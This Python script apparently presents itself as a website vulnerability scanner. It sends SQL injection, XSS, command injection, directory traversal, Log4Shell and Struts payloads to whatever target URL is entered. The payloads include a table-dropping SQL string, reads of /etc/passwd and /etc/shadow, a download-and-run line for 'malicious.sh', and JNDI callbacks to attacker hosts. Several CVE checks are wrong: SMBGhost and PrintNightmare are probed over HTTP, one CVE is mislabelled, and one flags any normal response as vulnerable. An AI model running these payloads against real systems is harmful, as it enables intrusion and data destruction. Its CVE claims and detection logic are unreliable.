#Code by Mobeiemi(Puck)
print("code by Mobeiemi(Puck)")

import requests
import time
import logging
import csv
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin
from urllib.parse import urlparse, quote

logging.basicConfig(
    filename="sql_injection_check.log",
    filemode="a",
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

# SQL inj
def check_sql_injection(url):
    print("\n[+] Checking for SQL Injection...")
    payloads = [
        "' OR 1=1--",
        "' OR 'a'='a",
        "'; DROP TABLE users--",
        "' OR 1=1#",
        "' AND 1=2 UNION SELECT null, null--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' UNION SELECT 1, @@version--",
    ]
    headers = {"User-Agent": "SQLInjectionTester/1.0"}
    cookies = {"session": "test_payload"}
    vulnerable = False

    def test_payload(payload):
        nonlocal vulnerable
        try:
            response = requests.get(url, params={"id": payload}, headers=headers, cookies=cookies)
            if any(err in response.text.lower() for err in ["syntax error", "sql error", "you have an error in your sql syntax"]):
                print(f"  [-] Potential SQL Injection vulnerability with payload: {payload}")
                logging.warning(f"Vulnerable payload: {payload} - Response: {response.text[:100]}")
                vulnerable = True
            elif "delay" in payload and response.elapsed.total_seconds() > 5:
                print(f"  [-] Time-based SQL Injection vulnerability with payload: {payload}")
                logging.warning(f"Time-based payload: {payload} - Response time: {response.elapsed.total_seconds()}")
                vulnerable = True
        except Exception as e:
            print(f"  [!] Error testing payload {payload}: {e}")
            logging.error(f"Error testing payload {payload}: {e}")

    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(test_payload, payloads)

    if not vulnerable:
        print("  [+] No SQL Injection vulnerabilities found.")
        logging.info("No SQL Injection vulnerabilities found.")


logging.basicConfig(
    filename="xss_check.log",
    filemode="a",
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

#XSS 
def check_xss(url):
    print("\n[+] Checking for Cross-Site Scripting (XSS)...")
    payloads = [
        '<script>alert("XSS")</script>',
        "<img src='x' onerror='alert(1)'>",
        "<svg onload=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<body onload=alert('XSS')>",
        "'\"><script>alert(1)</script>",
    ]
    headers = {"User-Agent": "XSSInjectionTester/1.0"}
    cookies = {"session": "test_payload"}
    vulnerable = False

    def test_payload(payload):
        nonlocal vulnerable
        try:
            response = requests.get(url, params={"search": payload}, headers=headers, cookies=cookies)
            if payload in response.text:
                print(f"  [-] Potential XSS vulnerability with payload: {payload}")
                logging.warning(f"Vulnerable payload: {payload} - Response: {response.text[:100]}")
                vulnerable = True
            else:
                encoded_payload = payload.replace("<", "&lt;").replace(">", "&gt;")
                if encoded_payload in response.text:
                    print(f"  [-] Potential encoded XSS vulnerability with payload: {payload}")
                    logging.warning(f"Encoded vulnerable payload: {payload} - Response: {response.text[:100]}")
                    vulnerable = True
        except Exception as e:
            print(f"  [!] Error testing payload {payload}: {e}")
            logging.error(f"Error testing payload {payload}: {e}")

    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(test_payload, payloads)

    if not vulnerable:
        print("  [+] No XSS vulnerabilities found.")
        logging.info("No XSS vulnerabilities found.")

logging.basicConfig(
    filename="command_injection_check.log",
    filemode="a",
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

# CMD Injection 
def check_command_injection(url):
    print("\n[+] Checking for Command Injection...")
    payloads = [
        "; ls",
        "&& whoami",
        "| cat /etc/passwd",
        "; id",
        "&& uname -a",
        "| ping -c 1 127.0.0.1",
        "; ps aux",
        "&& netstat -tuln",
        "; cat /etc/hostname",
    ]
    headers = {"User-Agent": "CommandInjectionTester/1.0"}
    cookies = {"session": "test_payload"}
    vulnerable = False

    def test_payload(payload):
        nonlocal vulnerable
        try:
            #GET
            response = requests.get(url, params={"cmd": payload}, headers=headers, cookies=cookies)
            if "root" in response.text or "bin" in response.text or "uid" in response.text:
                print(f"  [-] Potential Command Injection vulnerability with payload: {payload}")
                logging.warning(f"Vulnerable payload: {payload} - Response: {response.text[:100]}")
                vulnerable = True
            #POST
            response_post = requests.post(url, data={"cmd": payload}, headers=headers, cookies=cookies)
            if "root" in response_post.text or "bin" in response_post.text or "uid" in response_post.text:
                print(f"  [-] Potential Command Injection vulnerability (POST) with payload: {payload}")
                logging.warning(f"Vulnerable payload (POST): {payload} - Response: {response_post.text[:100]}")
                vulnerable = True
        except Exception as e:
            print(f"  [!] Error testing payload {payload}: {e}")
            logging.error(f"Error testing payload {payload}: {e}")

    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(test_payload, payloads)

    if not vulnerable:
        print("  [+] No Command Injection vulnerabilities found.")
        logging.info("No Command Injection vulnerabilities found.")
        
logging.basicConfig(
    filename="directory_traversal_check.log",
    filemode="a",
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

# Directory Traversal (DT)
def check_directory_traversal(url):
    print("\n[+] Checking for Directory Traversal...")
    payloads = [
        "../../../../etc/passwd",
        "../../../../windows/system32/drivers/etc/hosts",
        "../../../../var/www/html/index.php",
        "../../../..//..//..//..//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  
        "../../../etc/hosts",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",  
        "../../../../..//..//..//..//etc/shadow",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",  
        "../../../../..//..//..//..//windows/system32/drivers/etc/hosts",  
    ]
    headers = {"User-Agent": "DirectoryTraversalTester/1.0"}
    cookies = {"session": "test_payload"}
    vulnerable = False

    def test_payload(payload):
        nonlocal vulnerable
        try:
            # GET
            response = requests.get(url, params={"file": payload}, headers=headers, cookies=cookies)
            if "root:x" in response.text or "127.0.0.1" in response.text or "etc/passwd" in response.text:
                print(f"  [-] Potential Directory Traversal vulnerability with payload: {payload}")
                logging.warning(f"Vulnerable payload: {payload} - Response: {response.text[:100]}")
                vulnerable = True
            # POST
            response_post = requests.post(url, data={"file": payload}, headers=headers, cookies=cookies)
            if "root:x" in response_post.text or "127.0.0.1" in response_post.text or "etc/passwd" in response_post.text:
                print(f"  [-] Potential Directory Traversal vulnerability (POST) with payload: {payload}")
                logging.warning(f"Vulnerable payload (POST): {payload} - Response: {response_post.text[:100]}")
                vulnerable = True
        except Exception as e:
            print(f"  [!] Error testing payload {payload}: {e}")
            logging.error(f"Error testing payload {payload}: {e}")

    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(test_payload, payloads)

    if not vulnerable:
        print("  [+] No Directory Traversal vulnerabilities found.")
        logging.info("No Directory Traversal vulnerabilities found.")


logging.basicConfig(
    filename="rce_check.log",
    filemode="a",
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

# RCE 
def check_remote_code_execution(url):
    print("\n[+] Checking for Remote Code Execution (RCE)...")
    payloads = [
        "; ls",
        "&& whoami",
        "| cat /etc/passwd",
        "; id",
        "&& uname -a",
        "| ping -c 1 127.0.0.1",
        "; ps aux",
        "&& netstat -tuln",
        "; cat /etc/hostname",
        "&& wget http://example.com/malicious.sh -O /tmp/malicious.sh && bash /tmp/malicious.sh",  
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  
    ]
    headers = {"User-Agent": "RCECheckTool/1.0"}
    cookies = {"session": "test_payload"}
    vulnerable = False

    def test_payload(payload):
        nonlocal vulnerable
        try:
            # GET
            response = requests.get(url, params={"cmd": payload}, headers=headers, cookies=cookies)
            if "root" in response.text or "bin" in response.text or "uid" in response.text:
                print(f"  [-] Potential RCE vulnerability with payload: {payload}")
                logging.warning(f"Vulnerable payload (GET): {payload} - Response: {response.text[:100]}")
                vulnerable = True
            # POST
            response_post = requests.post(url, data={"cmd": payload}, headers=headers, cookies=cookies)
            if "root" in response_post.text or "bin" in response_post.text or "uid" in response_post.text:
                print(f"  [-] Potential RCE vulnerability (POST) with payload: {payload}")
                logging.warning(f"Vulnerable payload (POST): {payload} - Response: {response_post.text[:100]}")
                vulnerable = True
        except Exception as e:
            print(f"  [!] Error testing payload {payload}: {e}")
            logging.error(f"Error testing payload {payload}: {e}")

    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(test_payload, payloads)

    if not vulnerable:
        print("  [+] No RCE vulnerabilities found.")
        logging.info("No RCE vulnerabilities found.")


logging.basicConfig(
    filename="log4shell_check.log",
    filemode="a",
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

# Log4Shell 
def check_log4shell(url):
    print("\n[+] Checking for CVE-2021-44228 (Log4Shell)...")

    # ploads
    payloads = [
        "${jndi:ldap://example.com/a}",
        "${jndi:rmi://example.com/a}",
        "${jndi:dns://example.com/a}",
        "${jndi:http://example.com/a}",
        "${jndi:ldap://example.com/b}",
        "${jndi:ldap://attacker.com:1389/a}",
    ]

    attack_server = "example.com" 

    headers = {"User-Agent": payloads[0]}
    timeout = 5
    retries = 3 

    vulnerable = False

    for payload in payloads:
        headers["User-Agent"] = payload 

        for _ in range(retries):
            try:
                response = requests.get(url, headers=headers, timeout=timeout)
                
                if response.status_code == 200:
                    if attack_server in response.text:
                        print(f"  [-] Potential vulnerability to Log4Shell detected with payload: {payload}")
                        logging.warning(f"Vulnerable payload: {payload} - Response: {response.text[:100]}")
                        vulnerable = True
                        break  
                else:
                    print(f"  [+] No vulnerability found with payload: {payload}")
            except requests.RequestException as e:
                print(f"  [!] Error testing payload {payload}: {e}")
                logging.error(f"Error testing payload {payload}: {e}")
                continue

    if not vulnerable:
        print("  [+] No Log4Shell vulnerability found.")
        logging.info("No Log4Shell vulnerability found.")


logging.basicConfig(
    filename="smbghost_check.log",
    filemode="a",
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

#CVE-2020-0796
def check_smbghost(url):
    print("\n[+] Checking for CVE-2020-0796 (SMBGhost)...")

    
    payloads = [
        "smb",  
        "SMB",  
        "SMBGhost",  
        "smb://",  
        "smbc://",  
        "smb://example.com",  
    ]

   
    headers_list = [
        {"User-Agent": "Mozilla/5.0"},
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"Accept": "application/json"},
    ]

    timeout = 5  
    retries = 3  

    vulnerable = False

    for payload in payloads:
        for headers in headers_list:
            for _ in range(retries):  
                try:
                    response = requests.get(url, headers=headers, params={"q": payload}, timeout=timeout)
                    if response.status_code == 200 and (payload.lower() in response.text.lower()):
                        print(f"  [-] Potential vulnerability to SMBGhost detected with payload: {payload}")
                        logging.warning(f"Vulnerable payload: {payload} - Headers: {headers} - Response: {response.text[:100]}")
                        vulnerable = True
                        break 
                except requests.RequestException as e:
                    print(f"  [!] Error testing payload {payload} with headers {headers}: {e}")
                    logging.error(f"Error testing payload {payload} with headers {headers}: {e}")
                    continue

    if not vulnerable:
        print("  [+] No SMBGhost vulnerability found.")
        logging.info("No SMBGhost vulnerability found.")


# Cấu hình log
logging.basicConfig(
    filename="apache_struts_rce_check.log",
    filemode="a",
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

#CVE-2017-5638 
def check_apache_struts_rce(url):
    print("\n[+] Checking for CVE-2017-5638 (Apache Struts RCE)...")

    # RCE
    payloads = [
        {"action": "${${}}"},  
        {"action": "${(new java.lang.ProcessBuilder('id')).start()}"},
        {"action": "${(new java.lang.ProcessBuilder('ls')).start()}"},
        {"action": "${(new java.lang.ProcessBuilder('echo vulnerable')).start()}"},
        {"action": "${(new java.net.URL('http://example.com')).openStream()}"},
    ]

    headers_list = [
        {"User-Agent": "Mozilla/5.0"},
        {"Content-Type": "application/x-www-form-urlencoded"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"Accept": "application/json"},
    ]

    timeout = 5  
    retries = 3  
    vulnerable = False

    for payload in payloads:
        for headers in headers_list:
            for _ in range(retries):  
                try:
                    response = requests.post(url, data=payload, headers=headers, timeout=timeout)

                    if response.status_code == 500 or "struts" in response.text.lower() or "vulnerable" in response.text.lower():
                        print(f"  [-] Potential vulnerability to Apache Struts RCE detected with payload: {payload}")
                        logging.warning(f"Vulnerable payload: {payload} - Headers: {headers} - Response: {response.text[:100]}")
                        vulnerable = True
                        break  

                except requests.RequestException as e:
                    print(f"  [!] Error testing payload {payload} with headers {headers}: {e}")
                    logging.error(f"Error testing payload {payload} with headers {headers}: {e}")
                    continue

    if not vulnerable:
        print("  [+] No Apache Struts RCE vulnerability found.")
        logging.info("No Apache Struts RCE vulnerability found.")


logging.basicConfig(
    filename="printnightmare_check.log",
    filemode="a",
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

# CVE-2021-34527 
def check_printnightmare(url):
    print("\n[+] Checking for CVE-2021-34527 (PrintNightmare)...")

    payloads = [
        {"data": "test"},
        {"data": "exploit"},
        {"data": "${jndi:ldap://example.com/a}"},
        {"data": "file:///etc/passwd"},  
        {"data": "%%${print:EXTERNAL}"},  
    ]

    headers_list = [
        {"User-Agent": "Mozilla/5.0"},
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"Referer": "http://example.com"},
        {"Accept-Encoding": "gzip, deflate"},
    ]

    timeout = 5  
    retries = 3  
    vulnerable = False

    for payload in payloads:
        for headers in headers_list:
            for _ in range(retries):  
                try:
                    encoded_payload = {key: quote(value) for key, value in payload.items()}
                    
                    response = requests.get(url, params=encoded_payload, headers=headers, timeout=timeout)

                    if response.status_code == 200 and ("exploit" in response.text.lower() or "error" in response.text.lower()):
                        print(f"  [-] Potential PrintNightmare vulnerability detected with payload: {payload}")
                        logging.warning(f"Vulnerable payload: {payload} - Headers: {headers} - Response: {response.text[:100]}")
                        vulnerable = True
                        break  

                except requests.RequestException as e:
                    print(f"  [!] Error testing payload {payload} with headers {headers}: {e}")
                    logging.error(f"Error testing payload {payload} with headers {headers}: {e}")
                    continue

    if not vulnerable:
        print("  [+] No PrintNightmare vulnerability found.")
        logging.info("No PrintNightmare vulnerability found.")



logging.basicConfig(
    filename="spring4shell_check.log",
    filemode="a",
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

# CVE-2022-22965
def check_spring4shell(url):
    print("\n[+] Checking for CVE-2022-22965 (Spring4Shell)...")
    payloads = [
        {"springframework": "test"},
        {"springframework": "${jndi:ldap://example.com/a}"},
        {"springframework": "file:///etc/passwd"}, 
        {"springframework": "<script>alert('XSS')</script>"},  
        {"springframework": "${${}}"}  
    ]
    headers_list = [
        {"User-Agent": "Mozilla/5.0"},
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"Referer": "http://example.com"},
        {"Accept-Encoding": "gzip, deflate"},
    ]

    timeout = 5  
    retries = 3  

    vulnerable = False

    for payload in payloads:
        for headers in headers_list:
            for _ in range(retries):  
                try:
                    
                    encoded_payload = {key: quote(value) for key, value in payload.items()}
                    
                    response = requests.post(url, data=encoded_payload, headers=headers, timeout=timeout)

                    
                    if response.status_code == 200 and ("error" in response.text.lower() or "exception" in response.text.lower()):
                        print(f"  [-] Potential Spring4Shell vulnerability detected with payload: {payload}")
                        logging.warning(f"Vulnerable payload: {payload} - Headers: {headers} - Response: {response.text[:100]}")
                        vulnerable = True
                        break 

                except requests.RequestException as e:
                    print(f"  [!] Error testing payload {payload} with headers {headers}: {e}")
                    logging.error(f"Error testing payload {payload} with headers {headers}: {e}")
                    continue

    if not vulnerable:
        print("  [+] No Spring4Shell vulnerability found.")
        logging.info("No Spring4Shell vulnerability found.")



logging.basicConfig(
    filename="cve_2023_23397_check.log",
    filemode="a",
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

# CVE-2023-23397 
def check_cve_2023_23397(url):
    print("\n[+] Checking for CVE-2023-23397 (Microsoft Outlook Elevation of Privilege)...")
    payloads = [
        {"User-Agent": "Outlook/Exchange Exploit"},
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Outlook/Exchange Exploit"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"Referer": "http://malicious.com"}
    ]
    
    timeout = 5  
    retries = 3  
    vulnerable = False

    for payload in payloads:
        for _ in range(retries):  
            try:
                response = requests.get(url, headers=payload, timeout=timeout)
                if response.status_code == 200:
                    print(f"  [-] Potential CVE-2023-23397 vulnerability detected with headers: {payload}")
                    logging.warning(f"Vulnerable headers: {payload} - Response: {response.text[:100]}")
                    vulnerable = True
                    break  

            except requests.RequestException as e:
                print(f"  [!] Error testing payload {payload}: {e}")
                logging.error(f"Error testing payload {payload}: {e}")
                continue

    if not vulnerable:
        print("  [+] No CVE-2023-23397 vulnerability found.")
        logging.info("No CVE-2023-23397 vulnerability found.")



logging.basicConfig(
    filename="cve_2023_3519_check.log",
    filemode="a",
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

#CVE-2023-3519 
def check_cve_2023_3519(url):
    print("\n[+] Checking for CVE-2023-3519 (Cisco ISE RCE)...")
    payloads = [
        {"username": "test", "password": "test"},
        {"username": "admin", "password": "admin"},
        {"username": "' OR 1=1 --", "password": "test"},
        {"username": "admin' --", "password": "password"},
        {"username": "${jndi:ldap://malicious.com/a}", "password": "test"}
    ]
    
    headers_list = [
        {"User-Agent": "CiscoISEExploit/1.0"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"Authorization": "Basic YWRtaW46YWRtaW4="} 
    ]

    timeout = 5 
    retries = 3  
    vulnerable = False

    for payload in payloads:
        for headers in headers_list:
            for _ in range(retries): 
                try:
                    response = requests.post(url, data=payload, headers=headers, timeout=timeout)
                    if response.status_code == 200 and "exec" in response.text:
                        print(f"  [-] Potential CVE-2023-3519 vulnerability detected with payload: {payload} and headers: {headers}")
                        logging.warning(f"Vulnerable payload: {payload} - headers: {headers} - Response: {response.text[:100]}")
                        vulnerable = True
                        break  

                except requests.RequestException as e:
                    print(f"  [!] Error testing payload {payload} with headers {headers}: {e}")
                    logging.error(f"Error testing payload {payload} with headers {headers}: {e}")
                    continue

    if not vulnerable:
        print("  [+] No CVE-2023-3519 vulnerability found.")
        logging.info("No CVE-2023-3519 vulnerability found.")


# website
def scan_website(url):
    print(f"\n[+] Starting website vulnerability scan for: {url}\n")

    check_sql_injection(url)
    check_xss(url)
    check_command_injection(url)
    check_directory_traversal(url)
    check_remote_code_execution(url)
    
    check_log4shell(url)
    check_smbghost(url)
    check_apache_struts_rce(url)
    check_printnightmare(url)
    check_spring4shell(url)
    check_cve_2023_23397(url)
    check_cve_2023_3519(url)

    print("\n[+] Scan completed.")

if __name__ == "__main__":
    target_url = input("Enter the target website URL (e.g., https://example.com): ").strip()

    if not target_url.startswith("http"):
        print("[-] Invalid URL format. Make sure to include 'http://' or 'https://'")
    else:
        try:
            scan_website(target_url)
        except Exception as e:
            print(f"[-] An error occurred: {e}")

